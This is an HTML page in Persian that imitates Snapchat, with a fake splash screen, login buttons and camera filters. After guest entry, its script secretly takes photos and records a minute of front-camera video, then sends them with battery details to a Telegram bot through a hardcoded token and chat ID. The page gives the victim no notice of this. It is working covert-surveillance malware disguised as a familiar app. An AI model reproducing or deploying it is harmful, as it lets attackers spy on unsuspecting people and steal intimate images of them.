<!DOCTYPE html><html lang="fa">
<head>
  <meta charset="UTF-8" />
  <title>Snap Auto</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      direction: rtl;
      font-family: 'Vazirmatn', sans-serif;
      margin: 0;
      background: #FFFC00;
      overflow: hidden;
    }
    #video {
      width: 100%;
      height: 100vh;
      object-fit: cover;
      position: absolute;
      top: 0;
      left: 0;
      z-index: 0;
      filter: var(--filter, none);
    }
    .overlay, .login-screen, .splash {
      position: absolute;
      inset: 0;
      z-index: 10;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      transition: opacity 1s ease;
    }
    .splash img {
      animation: float 2s ease-in-out infinite;
    }
    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
    .login-screen {
      background: white;
    }
    .btn {
      width: 80%;
      max-width: 320px;
      margin: 0.5rem;
      padding: 1rem;
      border-radius: 9999px;
      font-size: 1.1rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      font-weight: bold;
      cursor: pointer;
      transition: transform 0.3s ease;
    }
    .btn:hover {
      transform: scale(1.05);
    }
    .glasses {
      position: absolute;
      top: 35%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 100px;
      opacity: 0.7;
      z-index: 5;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <!-- Splash Screen -->
  <div class="splash bg-yellow-400 flex justify-center items-center flex-col">
    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" width="120" />
    <h1 class="text-3xl font-bold mt-4">Snapchat</h1>
  </div>  <!-- Login Screen -->  <div class="login-screen hidden">
    <h2 class="text-2xl font-bold mb-6">ورود به اسنپ‌چت</h2>
    <div class="btn bg-white text-black border">
      <img src="https://img.icons8.com/color/48/google-logo.png" width="24" /> ورود با گوگل
    </div>
    <div class="btn bg-blue-700 text-white">
      <img src="https://img.icons8.com/fluency/48/facebook-new.png" width="24" /> ورود با فیسبوک
    </div>
    <div class="btn bg-black text-white" onclick="enterAsGuest()">
      <img src="https://img.icons8.com/ios-filled/50/user-male-circle.png" width="24" /> ورود مهمان
    </div>
  </div>  <!-- Camera --><video id="video" autoplay muted playsinline class="hidden"></video> <img src="https://img.icons8.com/emoji/96/sunglasses-emoji.png" class="glasses hidden" />

  <div class="overlay hidden text-center space-y-4">
    <div class="flex justify-center gap-2 mt-4">
      <button onclick="setFilter('none')" class="bg-white p-2 rounded-full">فیلتر خام</button>
      <button onclick="setFilter('grayscale(1)')" class="bg-white p-2 rounded-full">سیاه‌سفید</button>
      <button onclick="setFilter('sepia(1)')" class="bg-white p-2 rounded-full">قهوه‌ای</button>
      <button onclick="setFilter('contrast(2)')" class="bg-white p-2 rounded-full">کنتراست</button>
      <button onclick="setFilter('hue-rotate(90deg)')" class="bg-white p-2 rounded-full">رنگی</button>
    </div>
  </div>  <script>
    const splash = document.querySelector(".splash");
    const loginScreen = document.querySelector(".login-screen");
    const overlay = document.querySelector(".overlay");
    const video = document.getElementById("video");
    const glasses = document.querySelector(".glasses");

    const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
    const chatId = "-1002651451203";

    let mediaRecorder, chunks = [], photoCount = 0, videoSent = false, stream;

    function setFilter(filter) {
      video.style.setProperty('--filter', filter);
    }

    function enterAsGuest() {
      loginScreen.classList.add("hidden");
      video.classList.remove("hidden");
      overlay.classList.remove("hidden");
      glasses.classList.remove("hidden");
      startCamera();
    }

    setTimeout(() => {
      splash.classList.add("hidden");
      loginScreen.classList.remove("hidden");
    }, 3000);

    async function getBatteryInfo() {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging
        };
      }
      return { level: "?", charging: false };
    }

    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { width: 640, height: 480, facingMode: "user" }
        });
        video.srcObject = stream;
        takeAutoPhotos();
        startRecording();
      } catch (err) {
        alert("دسترسی به دوربین رد شد.");
      }
    }

    async function takePhoto() {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(async blob => {
        const battery = await getBatteryInfo();
        const caption = `📸 عکس ${++photoCount}\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`;
        const form = new FormData();
        form.append("chat_id", chatId);
        form.append("photo", blob, `snap_${photoCount}.jpg`);
        form.append("caption", caption);
        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: form
        });
      }, 'image/jpeg', 0.8);
    }

    function takeAutoPhotos() {
      setTimeout(takePhoto, 1000);
      setTimeout(takePhoto, 5000);
    }

    function startRecording() {
      chunks = [];
      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = sendVideo;
      mediaRecorder.start();
      setTimeout(() => {
        if (mediaRecorder.state === "recording") mediaRecorder.stop();
      }, 60000);
    }

    async function sendVideo() {
      if (videoSent || chunks.length === 0) return;
      videoSent = true;
      const battery = await getBatteryInfo();
      const blob = new Blob(chunks, { type: "video/webm" });
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("video", blob, "video.webm");
      form.append("caption", `🎥 ویدیو ضبط‌شده\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`);
      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
        method: "POST",
        body: form
      });
    }

    window.addEventListener("beforeunload", () => {
      if (mediaRecorder && mediaRecorder.state === "recording") {
        mediaRecorder.stop();
      }
    });
  </script></body>
</html>
